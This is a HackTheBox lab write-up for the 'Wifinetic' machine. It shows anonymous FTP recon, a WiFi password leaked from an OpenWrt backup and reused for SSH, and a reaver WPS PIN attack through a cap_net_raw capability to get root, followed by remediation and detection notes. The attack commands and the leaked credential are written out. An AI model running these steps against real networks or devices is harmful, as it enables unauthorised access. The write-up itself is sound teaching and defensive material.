# HackTheBox — Wifinetic

> **OS:** Linux (Ubuntu 20.04)  ·  **Difficulty:** Easy  ·  **Date:** 2026-08-15

**Kill chain:** `anonymous FTP → OpenWrt config backup leaks WiFi PSK → password reuse → SSH → reaver + cap_net_raw WPS attack on local AP → recovers root's password → root`

---

## Overview

Wifinetic is a wireless-themed easy box. Anonymous FTP exposes a set of documents and an **OpenWrt configuration backup** containing a cleartext WiFi PSK. That PSK is reused for a local system account (`netadmin`), giving SSH access. Privilege escalation is the box's signature move: the `reaver` binary carries the **`cap_net_raw` capability**, letting an unprivileged user run a **WPS PIN attack against the machine's own (simulated) access point** to recover the WPA passphrase — which is also root's password.

The whole box is a breadcrumb trail: a migration checklist explicitly says "Test for security issues with Reaver," and simulated wireless interfaces (`mac80211_hwsim`) are present. Read the clues and the intended path is obvious; the enumeration is the work.

---

## Recon

```bash
nmap -sC -sV -p- 10.129.229.90
```

```
21/tcp open  ftp     vsftpd 3.0.3   (anonymous login allowed)
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
53/tcp open  tcpwrapped
```

Anonymous FTP is open and lists files directly:

```
MigrateOpenWrt.txt
ProjectGreatMigration.pdf
ProjectOpenWRT.pdf
backup-OpenWrt-2023-07-26.tar
employees_wellness.pdf
```

Pull everything:

```bash
wget -r ftp://anonymous:anon@10.129.229.90/
```

The PDFs are largely flavour — they yield the domain `wifinetic.htb`, an email-naming convention, and a few names (none of which turn out to be the foothold account). Two files matter:

- **`MigrateOpenWrt.txt`** — a migration checklist with the line *"Test for security issues with Reaver tool."* Reaver = WPS PIN brute-force. This is the privesc breadcrumb, dropped in recon.
- **`backup-OpenWrt-2023-07-26.tar`** — an OpenWrt config backup.

---

## Foothold — PSK reuse

Extract the backup and read the wireless config:

```bash
tar xf backup-OpenWrt-2023-07-26.tar
cat etc/config/wireless
```

```
config wifi-iface 'wifinet0'
    option ssid 'OpenWrt'
    option encryption 'psk'
    option key 'VeRyUniUqWiFIPasswrd1!'
    option wps_pushbutton '1'
```

A cleartext WPA PSK: **`VeRyUniUqWiFIPasswrd1!`**. The backup's `etc/passwd` also reveals a non-obvious account beyond the PDF names:

```
netadmin:x:999:999::/home/netadmin:/bin/false
```

The PDF names don't reuse the PSK, but `netadmin` does:

```bash
ssh netadmin@10.129.229.90      # VeRyUniUqWiFIPasswrd1!
cat user.txt
```

**Password reuse** — the WiFi PSK doubles as the `netadmin` system password.

---

## Privilege Escalation — reaver + cap_net_raw WPS attack

Standard local enumeration (linpeas) is noisy on this box; the vector is in the **capabilities**, not sudo/SUID:

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/reaver = cap_net_raw+ep
```

And the interface state confirms the wireless surface:

```bash
ip a        # wlan0 = AP at 192.168.1.1, wlan1 = station, mon0 = monitor mode
iw dev
```

Root runs `hostapd` (an access point on `wlan0`, SSID "OpenWrt") and `wpa_supplicant`. Because **`reaver` holds `cap_net_raw`**, `netadmin` can run a raw-socket WPS attack against that local AP *without* being root — and a monitor interface (`mon0`) is already up.

Get the AP's BSSID and run reaver against it:

```bash
iw dev wlan0 info        # note the BSSID / MAC of the AP
reaver -i mon0 -b <BSSID> -vv -K 1
```

WPS is enabled (`wps_pushbutton '1'` from the backup), so reaver recovers the **WPS PIN** and, from it, the **WPA PSK**:

```
[+] WPS PIN: '12345670'
[+] WPA PSK: '<recovered passphrase>'
```

The recovered PSK is root's password (password reuse again). Switch to root:

```bash
su root        # <recovered PSK>
cat /root/root.txt
```

Root.

> **Note:** the box also has a root-run `wps_check.sh` cron and ~20 decoy employee accounts — both are theme/noise, not the vector. The capability on `reaver` is the intended path.

---

## Remediation

| Finding | Severity | Fix |
|---------|----------|-----|
| Anonymous FTP exposing config backups | High | Disable anonymous FTP, or restrict it to non-sensitive content; never expose device config backups. |
| Cleartext WiFi PSK in config backup | High | Backups containing secrets must be encrypted and access-controlled; rotate the exposed PSK. |
| Password reuse (WiFi PSK ↔ system account ↔ root) | **Critical** | Distinct credentials per purpose; a WiFi passphrase must never equal a shell or root password. |
| `cap_net_raw` on `reaver` | High | Do not grant raw-socket capability to attack tooling on production hosts; remove the capability (`setcap -r /usr/bin/reaver`). |
| WPS enabled | High | Disable WPS entirely — the PIN method is fundamentally brute-forceable (Reaver/Pixie-Dust). |

---

## Detection notes (blue-team view)

- **Anonymous FTP access is logged.** vsftpd records the anonymous login and the `RETR` of each backup file; alerting on anonymous retrieval of `*.tar`/config-shaped files from an internet-reachable FTP is high-signal.
- **The WPS attack is loud on the air/monitor interface.** Reaver sends a rapid flood of WPS EAPOL/M1-M7 association attempts to the AP. On a real deployment, hostapd logs repeated WPS negotiations from one client, and IDS/WIDS flags WPS brute-force — the classic Reaver signature. Rate-limiting/lockout on WPS (or disabling it) both detects and defeats this.
- **Credential reuse is correlatable.** The same secret appearing as the FTP-leaked PSK, the `netadmin` SSH password, and root's password is exactly the pivot chain; log correlation across FTP → SSH → `su` by timing surfaces it.
- **Capability assignment is auditable.** `cap_net_raw` on a non-standard binary like `reaver` is an artifact a config-baseline/file-integrity check should flag long before an attacker uses it.

---

## Lessons

- **Read the documents.** The `MigrateOpenWrt.txt` line about Reaver named the entire privesc during recon. The box tells you the path if you read what it hands you.
- **Enumerate every account, not just the obvious ones.** The PDF names were decoys; the real foothold account (`netadmin`) only appeared in the backup's `passwd`.
- **`getcap` belongs in every Linux privesc checklist.** This box has no sudo/SUID win — the vector is a Linux capability on an unexpected binary, which loose sudo-focused enumeration would miss.
- **Password reuse is the through-line.** One secret spanned WiFi, a user account, and root — the single most common real-world escalation, dressed up in a wireless theme.
